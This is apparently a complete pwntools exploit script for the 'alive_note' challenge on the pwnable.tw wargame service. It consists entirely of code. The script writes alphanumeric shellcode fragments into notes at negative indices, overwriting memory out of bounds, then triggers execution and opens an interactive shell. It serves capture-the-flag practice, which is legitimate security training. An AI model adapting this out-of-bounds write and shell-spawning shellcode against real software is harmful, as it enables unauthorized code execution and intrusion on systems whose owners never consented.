from pwn import *

# p = process('./alive_note')
p = remote('chall.pwnable.tw', 10300)

def Add(idx, name):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', str(idx))
    p.sendafter(':', name)

def Delete(idx):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(idx))

def sh(idx, shellcode):
    Add(idx, shellcode + 'u8')

    # padding
    Add(-1, 'A' * 8)
    Add(-1, 'A' * 8)
    Add(-1, 'A' * 8)

shellcode = asm("""
    xor ax, 0x3030
    dec edx
    dec edx
    """)
sh(-27, shellcode)

shellcode = asm("""
    xor ax, 0x3231
    dec edx
    dec edx
    """)
sh(0, shellcode)

shellcode = asm("""
    dec edx
    dec edx
    xor [eax+0x45], dl
    dec edi
    """)
sh(1, shellcode)

shellcode = asm("""
    xor [eax+0x46], dl
    dec edi
    dec edi
    dec edi
    """)
sh(2, shellcode)

shellcode = asm("""
    push 0x68734141
    pop eax
    """)
sh(3, shellcode)

shellcode = asm("""
    xor ax, 0x6e6e
    push ecx
    dec esi
    """)
sh(4, shellcode)

shellcode = asm("""
    push 0x6e696230
    pop ecx
    """)
sh(5, shellcode)

shellcode = asm("""
    dec ecx
    push ebx
    push eax
    push ecx
    push esp
    pop eax
    """)
sh(6, shellcode)

shellcode = asm("""
    push ebx
    push ebx
    push ebx
    push eax
    push ebx
    push ebx
    """)
sh(7, shellcode)

shellcode = asm("""
    push ebx
    push ebx
    popad
    push eax
    push ebx
    push esp
    """)
sh(8, shellcode)

shellcode = asm("""
    pop ecx
    push 0x41
    pop eax
    xor al, 0x4a
    """)
Add(9, shellcode + '\x37\x7a')

pause()
Delete(0)
p.interactive()
